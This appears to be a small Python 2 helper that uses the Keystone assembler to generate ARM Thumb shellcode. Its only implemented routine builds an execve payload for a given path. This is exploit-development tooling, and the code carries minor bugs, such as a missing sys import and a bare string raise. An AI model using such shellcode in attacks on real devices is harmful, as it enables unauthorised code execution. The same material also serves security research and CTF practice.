#!/usr/bin/env python

import os
from thumb import thumb_syscall

try:
    from keystone import *
except ImportError:
    print "keystone is key module for %s" % sys.argv[0]
    sys.exit(-1)

def ks_asm(arch, CODE):
    _arch = ''
    _mode = ''

    if arch == 'arm':
        _arch = KS_ARCH_ARM
        _mode = KS_MODE_ARM
    elif arch == 'thumb':
        _arch = KS_ARCH_ARM
        _mode = KS_MODE_THUMB
    else:
        _arch = KS_ARCH_ARM64
        _mode = KS_MODE_LITTLE_ENDIAN

    ks = Ks(_arch, _mode)
    data, count = ks.asm(CODE)

    return ''.join(map(chr, data)), count

class THUMB:
    arch = 'thumb'
    syscall = -1

    def __init__(self):
        pass

    def execve(self, *args):
        self.syscall = thumb_syscall.get_syscall('execve')
        if len(args) == 1:
            data  = b'mov r0, pc      ;' 
            data += b'adds r0, #11    ;'
            data += b'adds r2, r2, #1 ;'
            data += b'movs r7, #' + str(self.syscall) + ' ;'
            data += b'push {r0, r2}   ;'
            data += b'mov  r1, sp     ;'
            data += b'svc  1          ;'
            data += b'.asciz "{0}"'.format(args[0])
            sc, count = ks_asm(self.arch, data)
            return sc
        else:
            raise "Not implement yet"
